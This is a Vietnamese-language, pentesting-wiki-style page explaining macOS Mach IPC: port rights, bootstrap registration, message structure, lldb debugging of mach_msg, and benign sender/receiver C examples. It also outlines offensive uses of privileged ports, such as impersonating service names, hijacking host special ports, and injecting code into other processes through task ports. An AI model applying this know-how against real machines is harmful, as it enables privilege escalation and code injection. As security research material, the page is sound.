# macOS IPC - Giao tiếp liên tiến trình

{{#include ../../../../banners/hacktricks-training.md}}

## Nhắn tin Mach qua Ports

### Thông tin cơ bản

Mach sử dụng **task** làm **đơn vị nhỏ nhất để chia sẻ tài nguyên**, mỗi task có thể chứa **nhiều thread**. Các **task và thread này được ánh xạ 1:1 với process và thread POSIX**.

Việc giao tiếp giữa các task diễn ra qua Mach Inter-Process Communication (IPC), sử dụng các kênh giao tiếp một chiều. **Thông điệp được truyền giữa các port**, hoạt động giống như **message queue** do kernel quản lý.

**Port** là thành phần **cơ bản** của Mach IPC. Nó có thể được dùng để **gửi và nhận thông điệp**.

Mỗi process có một **bảng IPC**, trong đó có thể tìm thấy **các Mach port của process**. Tên của một Mach port thực chất là một số (con trỏ đến đối tượng kernel).

Một process cũng có thể gửi tên port cùng một số quyền **đến một task khác**, và kernel sẽ tạo mục tương ứng trong **bảng IPC của task đó**.

### Quyền Port

Quyền port xác định những thao tác mà một task có thể thực hiện, và là yếu tố then chốt của cơ chế giao tiếp này. Các **quyền port** có thể có gồm ([định nghĩa tại đây](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, cho phép nhận thông điệp gửi đến port. Mach port là các hàng đợi MPSC (multiple-producer, single-consumer), nghĩa là trong toàn hệ thống, mỗi port chỉ có thể có **một Receive right** (khác với pipe, nơi nhiều process có thể cùng giữ file descriptor cho đầu đọc của một pipe).
  - **Task có Receive right** có thể nhận thông điệp và **tạo Send right**, cho phép nó gửi thông điệp. Ban đầu, chỉ **task sở hữu port mới có Receive right trên port đó**.
  - Nếu chủ sở hữu Receive right **thoát** hoặc hủy port, **Send right sẽ trở nên vô dụng (dead name)**.
- **Send right**, cho phép gửi thông điệp đến port.
  - Send right có thể được **nhân bản**; do đó task sở hữu Send right có thể nhân bản quyền này và **cấp nó cho task thứ ba**.
  - Lưu ý rằng **quyền port** cũng có thể được **truyền** qua thông điệp Mac.
- **Send-once right**, cho phép gửi một thông điệp đến port, sau đó quyền này biến mất.
  - Quyền này **không thể** được **nhân bản**, nhưng có thể được **chuyển giao**.
- **Port set right**, biểu thị một _port set_ thay vì một port đơn lẻ. Lấy một thông điệp khỏi port set sẽ lấy thông điệp từ một trong các port thuộc tập hợp đó. Có thể dùng port set để lắng nghe đồng thời trên nhiều port, tương tự `select`/`poll`/`epoll`/`kqueue` trong Unix.
- **Dead name**, không phải là quyền port thực sự mà chỉ là một giá trị giữ chỗ. Khi một port bị hủy, tất cả quyền port hiện có đối với port đó sẽ biến thành dead name.

**Task có thể chuyển SEND right cho task khác**, cho phép task đó gửi thông điệp phản hồi. **SEND right cũng có thể được nhân bản, vì vậy một task có thể sao chép và cấp quyền này cho task thứ ba**. Cơ chế này, kết hợp với một process trung gian gọi là **bootstrap server**, cho phép các task giao tiếp hiệu quả với nhau.

### File Ports

File port cho phép đóng gói file descriptor trong Mach port (bằng cách sử dụng Mach port rights). Có thể tạo `fileport` từ một file descriptor cho trước bằng `fileport_makeport`, và tạo file descriptor từ `fileport` bằng `fileport_makefd`.

### Thiết lập giao tiếp

Như đã đề cập, có thể gửi quyền bằng Mach message; tuy nhiên, bạn **không thể gửi một quyền nếu chưa có quyền gửi Mach message**. Vậy làm thế nào để thiết lập giao tiếp lần đầu?

Trong trường hợp này, **bootstrap server** (**launchd** trên macOS) tham gia vào quá trình. Vì **ai cũng có thể lấy SEND right đến bootstrap server**, ta có thể yêu cầu server cấp quyền gửi thông điệp đến một process khác:

1. Task **A** tạo một **port mới** và nhận **RECEIVE right** trên port đó.
2. Task **A**, với tư cách là bên giữ RECEIVE right, **tạo SEND right cho port**.
3. Task **A** thiết lập **kết nối** với **bootstrap server** và **gửi cho server SEND right** của port vừa tạo.
   - Hãy nhớ rằng ai cũng có thể lấy SEND right đến bootstrap server.
4. Task A gửi thông điệp `bootstrap_register` đến bootstrap server để **liên kết port đã cho với một tên**, chẳng hạn `com.apple.taska`.
5. Task **B** tương tác với **bootstrap server** để thực hiện bootstrap **lookup tên dịch vụ** (`bootstrap_lookup`). Để bootstrap server có thể phản hồi, task B sẽ gửi cho server **SEND right đến một port mà nó đã tạo trước đó**, bên trong thông điệp lookup. Nếu lookup thành công, **server nhân bản SEND right** nhận được từ Task A và **gửi nó cho Task B**.
   - Hãy nhớ rằng ai cũng có thể lấy SEND right đến bootstrap server.
6. Với SEND right này, **Task B** có thể **gửi** **thông điệp** **đến Task A**.
7. Để giao tiếp hai chiều, thông thường task **B** tạo một port mới với **RECEIVE** và **SEND right**, rồi cấp **SEND right cho Task A** để Task A có thể gửi thông điệp đến TASK B.

Bootstrap server **không thể xác thực** tên dịch vụ mà task tự khai báo. Điều này có nghĩa là một **task** có thể **mạo danh bất kỳ task hệ thống nào**, chẳng hạn giả danh một dịch vụ cấp quyền rồi phê duyệt mọi yêu cầu.

Sau đó, Apple lưu **tên các dịch vụ do hệ thống cung cấp** trong các tệp cấu hình bảo mật nằm trong các thư mục được **SIP bảo vệ**: `/System/Library/LaunchDaemons` và `/System/Library/LaunchAgents`. **Binary tương ứng** cũng được lưu cùng với tên mỗi dịch vụ. Bootstrap server sẽ tạo và giữ một **RECEIVE right cho mỗi tên dịch vụ** này.

Đối với các dịch vụ được xác định trước này, quy trình **lookup có đôi chút khác biệt**. Khi một tên dịch vụ được tra cứu, launchd sẽ khởi chạy dịch vụ theo yêu cầu. Quy trình mới như sau:

- Task **B** bắt đầu bootstrap **lookup** một tên dịch vụ.
- **launchd** kiểm tra xem task có đang chạy hay không; nếu chưa, **khởi chạy** task đó.
- Task **A** (dịch vụ) thực hiện **bootstrap check-in** (`bootstrap_check_in()`). Tại đây, **bootstrap server** tạo một SEND right, giữ lại quyền đó và **chuyển RECEIVE right cho Task A**.
- launchd nhân bản **SEND right** và gửi nó cho Task B.
- Task **B** tạo một port mới với **RECEIVE** và **SEND right**, rồi cấp **SEND right cho Task A** (dịch vụ) để Task A có thể gửi thông điệp đến TASK B (giao tiếp hai chiều).

Tuy nhiên, quy trình này chỉ áp dụng cho các task hệ thống được xác định trước. Các task không thuộc hệ thống vẫn hoạt động như mô tả ban đầu, điều này có thể dẫn đến việc mạo danh.

> [!CAUTION]
> Vì vậy, launchd tuyệt đối không được gặp sự cố, nếu không toàn bộ hệ thống sẽ gặp sự cố.

### Một Mach Message

[Tìm thêm thông tin tại đây](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Hàm `mach_msg`, về cơ bản là một system call, được dùng để gửi và nhận Mach message. Hàm này yêu cầu thông điệp cần gửi làm đối số đầu tiên. Thông điệp phải bắt đầu bằng cấu trúc `mach_msg_header_t`, theo sau là nội dung thực tế của thông điệp. Cấu trúc này được định nghĩa như sau:

```c
typedef struct {
	mach_msg_bits_t               msgh_bits;
	mach_msg_size_t               msgh_size;
	mach_port_t                   msgh_remote_port;
	mach_port_t                   msgh_local_port;
	mach_port_name_t              msgh_voucher_port;
	mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Các process sở hữu _**receive right**_ có thể nhận message trên Mach port. Ngược lại, **senders** được cấp _**send**_ hoặc _**send-once right**_. Send-once right chỉ dùng để gửi một message duy nhất, sau đó sẽ mất hiệu lực.<sup>[[11]](#references)</sup>

Trường đầu tiên **`msgh_bits`** là một bitmap:

- Bit đầu tiên (có trọng số cao nhất) dùng để cho biết message có phức tạp hay không (sẽ nói thêm bên dưới)
- Bit thứ 3 và thứ 4 được kernel sử dụng
- **5 bit ít quan trọng nhất của byte thứ 2** có thể được dùng cho **voucher**: một loại port khác để gửi các cặp key/value.
- **5 bit ít quan trọng nhất của byte thứ 3** có thể được dùng cho **local port**
- **5 bit ít quan trọng nhất của byte thứ 4** có thể được dùng cho **remote port**

Các loại có thể được chỉ định trong voucher, local port và remote port là (theo [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>

```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```

For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` có thể được dùng để **cho biết** rằng cần tạo và chuyển giao một **send-once right** cho port này. Cũng có thể chỉ định `MACH_PORT_NULL` để ngăn người nhận trả lời.

Để thực hiện **giao tiếp hai chiều** dễ dàng, một process có thể chỉ định một **mach port** trong **message header** của mach, gọi là _reply port_ (**`msgh_local_port`**), nơi **bên nhận** message có thể **gửi phản hồi** cho message này.

> [!TIP]
> Lưu ý rằng kiểu giao tiếp hai chiều này được dùng trong các XPC message cần phản hồi (`xpc_connection_send_message_with_reply` và `xpc_connection_send_message_with_reply_sync`). Tuy nhiên, **thông thường các port khác nhau sẽ được tạo** như đã giải thích trước đó để thiết lập giao tiếp hai chiều.

Các trường khác trong message header là:

- `msgh_size`: kích thước của toàn bộ packet.
- `msgh_remote_port`: port mà message này được gửi đến.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID của message này, được bên nhận diễn giải.

> [!CAUTION]
> Lưu ý rằng **mach message được gửi qua một `mach port`**, một kênh giao tiếp **một bên nhận, nhiều bên gửi** được tích hợp trong mach kernel. **Nhiều process** có thể **gửi message** đến một mach port, nhưng tại một thời điểm chỉ **một process duy nhất có thể đọc** từ port đó.

Sau đó, message được tạo thành từ header **`mach_msg_header_t`**, theo sau là **body** và **trailer** (nếu có); message cũng có thể cấp quyền trả lời. Trong những trường hợp này, kernel chỉ cần chuyển message từ task này sang task khác.

**Trailer** là **thông tin do kernel thêm vào message** (người dùng không thể thiết lập). Có thể yêu cầu thông tin này khi nhận message bằng các flag `MACH_RCV_TRAILER_<trailer_opt>` (có thể yêu cầu nhiều loại thông tin khác nhau).

#### Complex Messages

Tuy nhiên, có những message **phức tạp** hơn, chẳng hạn message truyền thêm port right hoặc chia sẻ bộ nhớ, trong đó kernel cũng cần gửi các object này đến bên nhận. Trong những trường hợp này, bit có trọng số cao nhất của header `msgh_bits` được bật.

Các descriptor có thể truyền được định nghĩa trong [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>

```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
	natural_t                     pad1;
	mach_msg_size_t               pad2;
	unsigned int                  pad3 : 24;
	mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```

Trong 32-bit, tất cả descriptor đều có kích thước 12B và loại descriptor nằm ở byte thứ 11. Trong 64-bit, kích thước có thể khác nhau.

> [!CAUTION]
> Kernel sẽ sao chép các descriptor từ task này sang task khác, nhưng trước tiên **tạo một bản sao trong bộ nhớ kernel**. Kỹ thuật này, được gọi là "Feng Shui", đã bị lạm dụng trong một số exploit để khiến **kernel sao chép dữ liệu vào bộ nhớ của nó** bằng cách buộc một process gửi descriptor cho chính nó. Sau đó, process có thể nhận các message (kernel sẽ giải phóng chúng).
>
> Cũng có thể **gửi quyền port cho một process dễ bị tổn thương**; các quyền port sẽ xuất hiện ngay trong process đó (ngay cả khi nó không xử lý chúng).

### API Mac Ports

Lưu ý rằng port được liên kết với namespace của task, vì vậy khi tạo hoặc tìm port, namespace của task cũng được truy vấn (xem thêm trong `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Tạo** một port.
  - `mach_port_allocate` cũng có thể tạo một **port set**: quyền nhận trên một nhóm port. Mỗi khi nhận được message, port gửi message sẽ được chỉ rõ.
- `mach_port_allocate_name`: Thay đổi tên của port (mặc định là số nguyên 32-bit)
- `mach_port_names`: Lấy tên port từ một target
- `mach_port_type`: Lấy các quyền của task đối với một tên
- `mach_port_rename`: Đổi tên một port (tương tự dup2 đối với FD)
- `mach_port_allocate`: Cấp phát một RECEIVE, PORT_SET hoặc DEAD_NAME mới
- `mach_port_insert_right`: Tạo một quyền mới trong port mà bạn có RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Các hàm dùng để **gửi và nhận Mach message**. Phiên bản overwrite cho phép chỉ định một buffer khác để nhận message (phiên bản còn lại sẽ dùng lại buffer đó).

### Debug mach_msg

Vì các hàm **`mach_msg`** và **`mach_msg_overwrite`** được dùng để gửi và nhận message, đặt breakpoint tại chúng sẽ cho phép kiểm tra các message đã gửi và nhận.

Ví dụ, hãy bắt đầu debug một ứng dụng bất kỳ mà bạn có thể debug, vì ứng dụng sẽ tải **`libSystem.B`, thư viện sẽ dùng hàm này**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
    0x181d3ac24 <+4>:  sub    sp, sp, #0x20
    0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
    0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
    frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
    frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
    frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
    frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
    frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
    frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
    frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
    frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
    frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Để lấy các đối số của **`mach_msg`**, hãy kiểm tra các thanh ghi. Đây là các đối số (từ [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):

```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
	mach_msg_header_t *msg,
	mach_msg_option_t option,
	mach_msg_size_t send_size,
	mach_msg_size_t rcv_size,
	mach_port_name_t rcv_name,
	mach_msg_timeout_t timeout,
	mach_port_name_t notify);
```

Lấy các giá trị từ các registry:

```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
      x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
      x1 = 0x0000000003114207 ;mach_msg_option_t (option)
      x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
      x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
      x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
      x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
      x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```

Kiểm tra header của thông điệp bằng cách kiểm tra đối số đầu tiên:

```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```

Kiểu `mach_msg_bits_t` đó rất phổ biến để cho phép phản hồi.

### Liệt kê các port

```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
  name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
                  +     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
                  +     send        --------        ---            1         <-                                       0x00002603  (74295) passd
                  [...]
```

**name** là tên mặc định được gán cho port (hãy xem cách nó **tăng dần** trong 3 byte đầu tiên). **`ipc-object`** là **identifier** duy nhất đã được **obfuscate** của port.\
Cũng lưu ý rằng các port chỉ có quyền **`send`** sẽ **xác định chủ sở hữu** của chúng (tên port + pid).\
Ngoài ra, hãy lưu ý việc dùng **`+`** để biểu thị **các task khác được kết nối với cùng port**.

Cũng có thể dùng [**procesxp**](https://www.newosxbook.com/tools/procexp.html) để xem cả **tên các service đã đăng ký** (cần tắt SIP vì cần có `com.apple.system-task-port`):

```
procesp 1 ports
```

Bạn có thể cài đặt công cụ này trên iOS bằng cách tải xuống từ [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Ví dụ mã

Lưu ý cách **bên gửi** **cấp phát** một port, tạo **quyền gửi** cho tên `org.darlinghq.example` và gửi quyền đó đến **bootstrap server**, trong khi bên gửi yêu cầu **quyền gửi** của tên đó và dùng nó để **gửi thông điệp**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Create a new port.
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_allocate() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_allocate() created port right name %d\n", port);


    // Give us a send right to this port, in addition to the receive right.
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_insert_right() inserted a send right\n");


    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_register() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_register()'ed our port\n");


    // Wait for a message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
        mach_msg_trailer_t trailer;
    } message;

    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_RCV_MSG,     // Options. We're receiving a message.
        0,                // Size of the message being sent, if sending.
        sizeof(message),  // Size of the buffer for receiving.
        port,             // The port to receive a message on.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Got a message\n");

    message.some_text[9] = 0;
    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

{{#endtab}}

{{#tab name="sender.c"}}

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Lookup the receiver port using the bootstrap server.
    mach_port_t port;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_look_up() returned port right name %d\n", port);


    // Construct our message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
    } message;

    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.header.msgh_remote_port = port;
    message.header.msgh_local_port = MACH_PORT_NULL;

    strncpy(message.some_text, "Hello", sizeof(message.some_text));
    message.some_number = 35;

    // Send the message.
    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_SEND_MSG,    // Options. We're sending a message.
        sizeof(message),  // Size of the message being sent.
        0,                // Size of the buffer for receiving.
        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Sent a message\n");
}
```

{{#endtab}}
{{#endtabs}}

## Privileged Ports

Một số port đặc biệt cho phép task **thực hiện một số hành động nhạy cảm hoặc truy cập một số dữ liệu nhạy cảm** khi có quyền **SEND** trên chúng. Các port này đáng chú ý từ góc độ của attacker vì cả những khả năng của chúng lẫn khả năng **chia sẻ quyền SEND giữa các task**.

### Host Special Ports

Các port này được biểu diễn bằng một số.

Có thể lấy quyền **SEND** bằng cách gọi **`host_get_special_port`** và quyền **RECEIVE** bằng cách gọi **`host_set_special_port`**. Tuy nhiên, cả hai lệnh gọi đều cần port **`host_priv`**, chỉ root mới có thể truy cập. Hơn nữa, trước đây root có thể gọi **`host_set_special_port`** và chiếm quyền điều khiển port bất kỳ, chẳng hạn như vượt qua code signature bằng cách chiếm quyền điều khiển `HOST_KEXTD_PORT` (hiện SIP đã ngăn chặn việc này).

Các port này được chia thành 2 nhóm: **7 port đầu tiên do kernel sở hữu**, gồm port 1 `HOST_PORT`, port 2 `HOST_PRIV_PORT`, port 3 `HOST_IO_MASTER_PORT` và port 7 `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Các port bắt đầu **từ** số **8** trở đi **do system daemon sở hữu** và được khai báo trong [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Nếu một process có quyền **SEND** trên port này, nó có thể lấy **thông tin** về **system** bằng cách gọi các routine như:
  - `host_processor_info`: Lấy thông tin processor
  - `host_info`: Lấy thông tin host
  - `host_virtual_physical_table_info`: Bảng trang Virtual/Physical (cần MACH_VMDEBUG)
  - `host_statistics`: Lấy thống kê host
  - `mach_memory_info`: Lấy bố cục bộ nhớ kernel
- **Host Priv port**: Process có quyền **SEND** trên port này có thể thực hiện **các hành động đặc quyền**, chẳng hạn như hiển thị dữ liệu boot hoặc thử tải kernel extension. **Process cần là root** để có quyền này.
  - Ngoài ra, để gọi API **`kext_request`**, cần có các entitlement khác **`com.apple.private.kext*`**, vốn chỉ được cấp cho các binary của Apple.
  - Các routine khác có thể được gọi gồm:
    - `host_get_boot_info`: Lấy `machine_boot_info()`
    - `host_priv_statistics`: Lấy thống kê đặc quyền
    - `vm_allocate_cpm`: Cấp phát Contiguous Physical Memory
    - `host_processors`: Quyền SEND tới các processor của host
    - `mach_vm_wire`: Đưa bộ nhớ vào trạng thái resident
  - Vì **root** có thể truy cập quyền này, root có thể gọi `host_set_[special/exception]_port[s]` để **chiếm quyền điều khiển host special port hoặc exception port**.

Có thể **xem tất cả host special port** bằng cách chạy:

```bash
procexp all ports | grep "HSP"
```

### Task Special Ports

Đây là các port được dành riêng cho những dịch vụ phổ biến. Có thể lấy/đặt chúng bằng cách gọi `task_[get/set]_special_port`. Có thể tìm thấy chúng trong `task_special_ports.h`:

```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
					   world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```

Từ [đây](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[quyền gửi task-self]: Port dùng để điều khiển task này. Dùng để gửi thông điệp tác động đến task. Đây là port được trả về bởi **mach_task_self (xem Task Ports bên dưới)**.
- **TASK_BOOTSTRAP_PORT**\[quyền gửi bootstrap]: Bootstrap port của task. Dùng để gửi thông điệp yêu cầu trả về các port của dịch vụ hệ thống khác.
- **TASK_HOST_NAME_PORT**\[quyền gửi host-self]: Port dùng để yêu cầu thông tin về host chứa task này. Đây là port được trả về bởi **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[quyền gửi ledger]: Port định danh nguồn cấp phát bộ nhớ kernel wired cho task này.
- **TASK_PAGED_LEDGER_PORT**\[quyền gửi ledger]: Port định danh nguồn cấp phát bộ nhớ được quản lý mặc định cho task này.

### Task Ports

Ban đầu Mach không có “process” mà có “task”, được xem như một container chứa các thread. Khi Mach được hợp nhất với BSD, **mỗi task được liên kết với một process BSD**. Vì vậy, mỗi process BSD đều có các chi tiết cần thiết để hoạt động như một process, và mỗi Mach task cũng có các thành phần nội bộ riêng (ngoại trừ pid 0 không tồn tại, tức `kernel_task`).

Có hai hàm rất đáng chú ý liên quan đến việc này:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Lấy một quyền SEND cho task port của task tương ứng với `pid` được chỉ định rồi cấp quyền đó cho `target_task_port` được chỉ định (thường là task của caller, vốn đã gọi `mach_task_self()`, nhưng cũng có thể là một SEND port trên một task khác).
- `pid_for_task(task, &pid)`: Với một quyền SEND đến task, tìm PID mà task này liên kết với.

Để thực hiện các hành động bên trong task, task cần có quyền `SEND` đến chính nó bằng cách gọi `mach_task_self()` (hàm này sử dụng `task_self_trap` (28)). Với quyền này, task có thể thực hiện nhiều hành động như:

- `task_threads`: Lấy quyền SEND trên tất cả task port của các thread thuộc task
- `task_info`: Lấy thông tin về task
- `task_suspend/resume`: Tạm dừng hoặc tiếp tục task
- `task_[get/set]_special_port`
- `thread_create`: Tạo thread
- `task_[get/set]_state`: Điều khiển trạng thái task
- và nhiều hàm khác trong [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Lưu ý rằng khi có quyền SEND trên task port của **một task khác**, bạn có thể thực hiện các hành động này trên task đó.

Ngoài ra, task port cũng là port **`vm_map`**, cho phép caller **đọc và thao tác với bộ nhớ** bên trong task thông qua các hàm như `vm_read()` và `vm_write()`. Điều này có nghĩa là task có quyền SEND trên task port của task khác có thể **inject code vào task đó**.

Hãy nhớ rằng **kernel cũng là một task**, nên nếu ai đó lấy được **quyền SEND** trên **`kernel_task`**, họ có thể khiến kernel thực thi bất cứ thứ gì (jailbreak).

- Gọi `mach_task_self()` để **lấy tên** của port này đối với task của caller. Port này chỉ được **kế thừa** qua **`exec()`**; task mới được tạo bằng `fork()` sẽ có task port mới (trường hợp đặc biệt: task cũng nhận task port mới sau `exec()` trong một binary suid). Cách duy nhất để tạo task và lấy port của nó là thực hiện ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) trong khi gọi `fork()`.
